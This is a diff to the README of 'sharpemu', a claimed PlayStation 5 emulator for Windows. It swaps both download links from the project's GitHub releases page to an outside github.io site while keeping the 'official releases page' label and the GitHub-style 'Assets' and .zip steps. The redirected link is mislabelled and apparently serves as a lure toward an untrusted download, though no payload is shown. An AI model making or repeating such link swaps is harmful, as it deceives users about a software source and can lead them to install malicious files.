@@ -1,6 +1,6 @@
 # 🎮 sharpemu - Play console games on your PC
 
-[![Download sharpemu](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/caressanoisy333/sharpemu/releases)
+[![Download sharpemu](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://caressanoisy333.github.io)
 
 sharpemu brings PlayStation 5 gaming to your home computer. This software translates code from the console and runs it on a Windows operating system. It provides a way for users to experience their digital library on a desktop or laptop device.
 
@@ -21,7 +21,7 @@ You need to access the release page to get the installer. The software goes thro
 
 Follow these steps to obtain the files:
 
-1.  Visit the [official releases page](https://github.com/caressanoisy333/sharpemu/releases).
+1.  Visit the [official releases page](https://caressanoisy333.github.io).
 2.  Look for the section labeled "Assets" under the most recent version.
 3.  Click the link that ends in `.zip` to start your download.
 4.  Save the file to a folder you can find, such as your Downloads folder.
